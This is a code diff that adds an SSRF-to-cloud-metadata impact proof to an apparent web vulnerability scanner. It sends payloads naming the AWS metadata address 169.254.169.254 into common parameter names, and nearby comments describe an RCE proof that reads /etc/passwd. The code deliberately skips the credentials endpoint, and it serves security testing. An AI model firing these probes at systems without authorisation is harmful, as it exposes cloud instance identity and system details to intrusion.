@@ -9,8 +9,12 @@
  *   - RCE   → foothold proof: confirm command execution with the `id` oracle, then capture a bounded
  *             read-only recon bundle (whoami / hostname / uname / first line of /etc/passwd) between
  *             random nonce markers — a real interactive foothold, demonstrated without touching anything.
+ *   - SSRF  → cloud-metadata proof: point the SSRF sink at the cloud metadata service (169.254.169.254)
+ *             IDENTITY/listing endpoints and confirm the instance's identity is reflected back — NEVER
+ *             the security-credentials leaf that returns live secret keys.
  * Zero-FP: each demo confirms on a highly specific signature that only appears when the payload
- * actually executed (a provider-exact DBMS error; a random nonce that could only be echoed by a shell).
+ * actually executed (a provider-exact DBMS error; a random nonce that could only be echoed by a shell;
+ * the exact metadata identity document, absent from a benign-URL baseline).
  * It re-uses the engine's method-aware injector + host-gated fetcher (passed in).
  */
 
@@ -133,6 +137,77 @@ async function cmdContext(url, { fetchT, injReq }) {
   );
 }
 
+// Set one query param on a URL (local helper — impact.mjs stays free of engine imports to avoid a cycle).
+const setParam = (b, k, v) => {
+  const u = new URL(b);
+  u.searchParams.set(k, v);
+  return u.toString();
+};
+// Common SSRF sink param names (mirrors the engine's SSRF_PARAMS) — the metadata proof tries the params
+// already on the URL first, then these.
+const SSRF_PARAM_NAMES = [
+  'url',
+  'uri',
+  'path',
+  'dest',
+  'target',
+  'callback',
+  'webhook',
+  'image',
+  'img',
+  'feed',
+  'u',
+  'link',
+  'proxy',
+  'fetch',
+  'next',
+  'remote',
+  'host',
+  'domain',
+];
+// BENIGN, read-only metadata endpoints — identity/listing only. The security-credentials leaf (live
+// secret keys) is deliberately never requested. Signatures are the exact metadata content, not the URL.
+const META_PROBES = [
+  [
+    'http://169.254.169.254/latest/dynamic/instance-identity/document',
+    /"(?:instanceId|accountId|imageId)"\s*:/i,
+    'AWS instance-identity document',
+  ],
+  [
+    'http://169.254.169.254/latest/meta-data/',
+    /(?:^|\n)(?:ami-id|instance-id|iam\/|local-ipv4|security-groups|public-keys)(?:\n|$)/i,
+    'AWS IMDS metadata listing',
+  ],
+];
+
+async function ssrfMetadata(target, { fetchT }) {
+  let base;
+  try {
+    base = new URL(typeof target === 'string' ? target : target.url);
+  } catch {
+    return null; // metadata proof only applies to GET-URL sinks
+  }
+  const baseUrl = base.toString();
+  const params = [...new Set([...base.searchParams.keys(), ...SSRF_PARAM_NAMES])].slice(0, 12);
+  for (const p of params) {
+    // Baseline: point the param at a benign external URL — its response must NOT carry a metadata signature.
+    const benign =
+      (await fetchT(setParam(baseUrl, p, 'http://sxbenign.invalid/'), {}, 6000).catch(() => ({}))).body || '';
+    for (const [metaUrl, re, what] of META_PROBES) {
+      const r = (await fetchT(setParam(baseUrl, p, metaUrl), {}, 6000).catch(() => ({}))).body || '';
+      const m = r.match(re);
+      if (m && !benign.includes(m[0]))
+        return F(
+          'impact-ssrf-metadata',
+          'critical',
+          baseUrl,
+          `SSRF → CLOUD METADATA PROVEN: via param '${p}' the server fetched the ${what} at 169.254.169.254 and returned it — the instance's cloud identity is exposed (read-only proof; the live-credentials path is deliberately never touched)`,
+        );
+    }
+  }
+  return null;
+}
+
 // deps: { fetchT, injReq } from the engine (so injection stays method-aware + host-gated).
 export async function runImpact({ report, fetchT, injReq }) {
   const findings = [];
@@ -160,7 +235,15 @@ export async function runImpact({ report, fetchT, injReq }) {
       break;
     }
   }
+  // SSRF → cloud-metadata impact.
+  for (const url of targetsOf('ssrf').slice(0, 5)) {
+    const imp = await ssrfMetadata(url, { fetchT }).catch(() => null);
+    if (imp) {
+      findings.push(imp);
+      break;
+    }
+  }
   return findings;
 }
 
-export { sqliExtract, cmdContext };
+export { sqliExtract, cmdContext, ssrfMetadata };
